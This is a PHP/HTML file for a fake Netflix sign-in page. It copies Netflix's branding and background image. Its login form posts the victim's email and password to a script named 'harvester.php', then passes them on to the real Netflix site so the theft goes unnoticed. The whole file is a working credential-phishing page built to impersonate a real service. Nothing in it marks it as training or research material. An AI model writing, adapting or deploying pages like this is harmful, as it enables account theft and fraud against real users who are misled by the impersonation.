<?php
require_once __DIR__ . '/config.php';
$cfg = require __DIR__ . '/config.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Netflix</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Netflix Sans,Helvetica Neue,Helvetica,Arial,sans-serif;background:#000;color:#fff;min-height:100vh;position:relative}
.bg{position:fixed;inset:0;background:linear-gradient(rgba(0,0,0,.6),rgba(0,0,0,.6)),url('https://assets.nflxext.com/ffe/siteui/vlv3/ab180a28-7944-4442-8568-903870801804/web/IN-en-20240108-trifecta-penguin.jpg') center/cover no-repeat;filter:blur(2px);z-index:-1}
.nav{padding:20px 40px}
.nav .logo{color:#e50914;font-size:32px;font-weight:700;letter-spacing:-1px}
.wrap{display:flex;justify-content:center;padding:40px 20px}
.card{background:rgba(0,0,0,.75);padding:60px 68px 40px;width:450px;max-width:100%;border-radius:4px}
.card h1{font-size:32px;font-weight:700;margin-bottom:28px}
.card input{width:100%;padding:16px 20px;margin-bottom:16px;background:#333;border:none;border-radius:4px;color:#fff;font-size:16px}
.card input::placeholder{color:#8c8c8c}
.card button{width:100%;background:#e50914;color:#fff;border:none;padding:16px;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px;margin-bottom:12px}
.card button:hover{background:#f40612}
.card .row{display:flex;justify-content:space-between;align-items:center;font-size:13px;color:#b3b3b3;margin-bottom:16px}
.card .row a{color:#b3b3b3;text-decoration:none}
.card .row a:hover{text-decoration:underline}
.card .help{color:#b3b3b3;font-size:16px;margin-top:60px}
.card .help a{color:#fff;text-decoration:none}
.card .help a:hover{text-decoration:underline}
.signup{color:#737373;font-size:16px;margin-top:16px}
.signup a{color:#fff;text-decoration:none}
.signup a:hover{text-decoration:underline}
</style>
</head>
<body>
<div class="bg"></div>
<div class="nav"><span class="logo">NETFLIX</span></div>
<div class="wrap">
  <div class="card">
    <h1>Sign In</h1>
    <form method="POST" action="harvester.php?next=https://www.netflix.com/browse">
      <input type="text" name="email" placeholder="Email or phone number" autocomplete="username" required>
      <input type="password" name="pass" placeholder="Password" autocomplete="current-password" required>
      <button type="submit">Sign In</button>
      <div class="row">
        <label><input type="checkbox" style="width:auto;margin-right:6px">Remember me</label>
        <a href="#">Need help?</a>
      </div>
    </form>
    <div class="signup">New to Netflix? <a href="#">Sign up now.</a></div>
    <div class="help">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a></div>
  </div>
</div>
</body>
</html>
